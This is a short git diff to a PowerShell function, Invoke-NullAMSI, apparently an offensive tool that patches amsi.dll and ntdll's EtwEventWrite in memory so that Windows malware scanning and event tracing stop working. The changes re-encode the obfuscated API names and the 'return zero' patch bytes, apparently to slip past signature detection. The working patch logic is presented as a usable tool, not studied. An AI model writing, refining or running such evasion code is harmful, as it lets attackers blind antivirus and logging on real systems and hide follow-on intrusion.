@@ -89,11 +89,11 @@ function Invoke-NullAMSI {
     Write-Verbose "[*] Handle of ${GetProc}: $($GetAddres.MethodHandle.Value)"
 
     # "Same" technique as above
-    $bytes4msiInit = [Byte[]](65, 0, 109, 0, 115, 0, 105, 0, 73, 0, 110, 0, 105, 0, 116, 0, 105, 0, 97, 0, 108, 0, 105, 0, 122, 0, 101, 0)
-    $bytes4msi = [Byte[]](97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0)
-    $4msi = [System.Text.Encoding]::Unicode.GetString($bytes4msi)
-    $4msiInit = [System.Text.Encoding]::Unicode.GetString($bytes4msiInit)
-
+    $bytes4msiInit = [Byte[]](65, 109 , 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101)
+    $bytes4msi = [Byte[]](97, 109, 115, 105, 46, 100, 108, 108)
+    $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
+    $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
+    
     # Obtain the respective address from 4msi
     $4msiAddr = Get-Function $4msi $4msiInit
     if ($4msiAddr -eq $null) {
@@ -132,9 +132,9 @@ function Invoke-NullAMSI {
     $protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
     Write-Verbose "[*] Getting $name delegate"
 
-    # Declare varaibles
+    # Declare variables
     $PAGE_EXECUTE_WRITECOPY = 0x00000080
-    $patch = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
+    $patch = [byte[]] (184, 0, 0, 0, 0, 195)
     $p = 0; $i = 0
 
     Write-Verbose "[*] Calling $4msiInit to recieve a new AMS1 Context"
@@ -212,7 +212,7 @@ function Invoke-NullAMSI {
     if ($etw) {
         # Same methodology as for the 4MSI bypass
         Write-host "[*] Patching ETW" -ForegroundColor Cyan
-        $etwFunc = [System.Text.Encoding]::ASCII.GetString([Byte[]](0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65))
+        $etwFunc = [Text.Encoding]::ASCII.GetString([Byte[]](69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101))
 
         $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
         Write-Verbose "[*] Handle of ${etwFunc}: $etwAddr"
